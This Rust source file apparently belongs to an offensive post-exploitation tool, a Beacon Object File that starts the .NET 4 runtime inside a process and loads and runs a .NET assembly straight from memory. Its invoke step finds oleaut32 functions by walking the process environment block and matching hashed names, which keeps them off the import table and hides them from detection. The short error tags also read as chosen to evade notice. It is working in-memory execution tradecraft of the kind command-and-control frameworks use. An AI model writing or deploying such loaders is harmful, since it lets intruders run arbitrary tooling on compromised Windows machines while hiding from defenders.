//! .NET Framework 4.x path (ICLRMetaHost → ICorRuntimeHost → AppDomain.Load_3).

use crate::error::BofError;
use crate::pe_parser::AsmInfo;
use alloc::vec::Vec;
use core::ffi::c_void;
use opsec_com::appdomain::{AppDomain, Assembly, MethodInfo};
use opsec_com::bstr::OwnedBstr;
use opsec_com::clr::{ICorRuntimeHost, start_clr};
use opsec_com::comptr::{ComPtr, IUnknown};
use opsec_com::guids::IID_APP_DOMAIN;
use opsec_com::safearray::{OwnedSafeArray, SafeArray, VT_BSTR, VT_UI1, VT_VARIANT};
use opsec_com::variant::Variant;

const V4_VERSION: &[u16] = &[
    b'v' as u16, b'4' as u16, b'.' as u16, b'0' as u16, b'.' as u16,
    b'3' as u16, b'0' as u16, b'3' as u16, b'1' as u16, b'9' as u16, 0,
];

/// NetFx4 path orchestrator: start CLR → create domain → load assembly → invoke.
///
/// # Safety
/// `asm_bytes` must point to a valid .NET Framework 4.x managed PE.
pub unsafe fn run(
    info: &AsmInfo,
    asm_bytes: &[u8],
    app_domain: &str,
    asm_args: &str,
    entry_point_flag: u32,
) -> Result<(), BofError> {
    unsafe {
        let host = start(info)?;
        let domain = create_domain(&host, app_domain)?;
        let assembly = load_assembly(&domain, asm_bytes)?;
        invoke(&assembly, asm_args, entry_point_flag)
    }
}

unsafe fn start(_info: &AsmInfo) -> Result<ComPtr<ICorRuntimeHost>, BofError> {
    // NetFx4 path always uses v4.0.30319. .NET 2.0/3.5 (v2.0.50727) support
    // was removed in v0.2 — modern targets ship .NET 4.x by default.
    unsafe { start_clr(V4_VERSION).map_err(|hr| BofError::Clr { hr, op: "c1" }) }
}

unsafe fn create_domain(
    host: &ComPtr<ICorRuntimeHost>,
    name: &str,
) -> Result<ComPtr<AppDomain>, BofError> {
    unsafe {
        let mut wname: Vec<u16> = name.encode_utf16().collect();
        wname.push(0);
        let mut domain_unk: *mut c_void = core::ptr::null_mut();
        let h = host.as_raw();
        let hr = ((*(*h).vtbl).create_domain)(
            h as *mut c_void,
            wname.as_ptr(),
            core::ptr::null_mut(),
            &mut domain_unk,
        );
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c2" });
        }
        let mut domain: *mut c_void = core::ptr::null_mut();
        let unk = domain_unk as *mut IUnknown;
        let hr = ((*(*unk).vtbl).query_interface)(
            unk as *mut c_void,
            &IID_APP_DOMAIN,
            &mut domain,
        );
        ((*(*unk).vtbl).release)(unk as *mut c_void);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c3" });
        }
        ComPtr::<AppDomain>::from_raw(domain as *mut _)
            .ok_or(BofError::Clr { hr: -1, op: "c4" })
    }
}

unsafe fn load_assembly(
    domain: &ComPtr<AppDomain>,
    asm: &[u8],
) -> Result<ComPtr<Assembly>, BofError> {
    unsafe {
        let sa = OwnedSafeArray::create(VT_UI1, asm.len() as u32)
            .ok_or(BofError::Clr { hr: -1, op: "c5" })?;
        if !sa.copy_from(asm) {
            return Err(BofError::Clr { hr: -1, op: "c5b" });
        }

        let d = domain.as_raw();
        let mut asm_ptr: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*d).vtbl).load_3)(d as *mut c_void, sa.ptr, &mut asm_ptr);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c6" });
        }
        ComPtr::<Assembly>::from_raw(asm_ptr as *mut _)
            .ok_or(BofError::Clr { hr: -1, op: "c7" })
    }
}

unsafe fn invoke(
    asm: &ComPtr<Assembly>,
    args_str: &str,
    _entry_point: u32,
) -> Result<(), BofError> {
    unsafe {
        let a = asm.as_raw();
        let mut mi_ptr: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*a).vtbl).entry_point)(a as *mut c_void, &mut mi_ptr);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c8" });
        }
        let mi = mi_ptr as *mut MethodInfo;

        let tokens: Vec<&str> = args_str.split_whitespace().collect();
        let args_sa = OwnedSafeArray::create(VT_VARIANT, 1)
            .ok_or(BofError::Clr { hr: -1, op: "c9" })?;
        let bstr_array = OwnedSafeArray::create(VT_BSTR, tokens.len() as u32)
            .ok_or(BofError::Clr { hr: -1, op: "cA" })?;

        if let Some(oleaut) =
            opsec_peb::resolve_module(opsec_strcrypt::hash!("oleaut32.dll"))
        {
            if let Some(put) = opsec_peb::resolve_export(
                oleaut,
                opsec_strcrypt::hash!("SafeArrayPutElement"),
            ) {
                type PutFn = unsafe extern "system" fn(
                    *mut SafeArray,
                    *const i32,
                    *mut c_void,
                ) -> i32;
                let put_f: PutFn = core::mem::transmute(put);
                for (i, t) in tokens.iter().enumerate() {
                    let wide: Vec<u16> = t.encode_utf16().collect();
                    if let Some(bstr) = OwnedBstr::from_utf16(&wide) {
                        let idx = i as i32;
                        put_f(bstr_array.ptr, &idx, bstr.s as *mut c_void);
                        core::mem::forget(bstr);
                    }
                }
                let mut wrapper: Variant = core::mem::zeroed();
                wrapper.vt = 0x2008u16;
                wrapper.payload[0] = bstr_array.ptr as u64;
                let idx: i32 = 0;
                put_f(
                    args_sa.ptr,
                    &idx,
                    &mut wrapper as *mut Variant as *mut c_void,
                );
                core::mem::forget(bstr_array);
            }
        }

        let mut retval: Variant = core::mem::zeroed();
        let obj: Variant = core::mem::zeroed();
        let hr = ((*(*mi).vtbl).invoke_3)(mi as *mut c_void, obj, args_sa.ptr, &mut retval);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "cB" });
        }
        Ok(())
    }
}
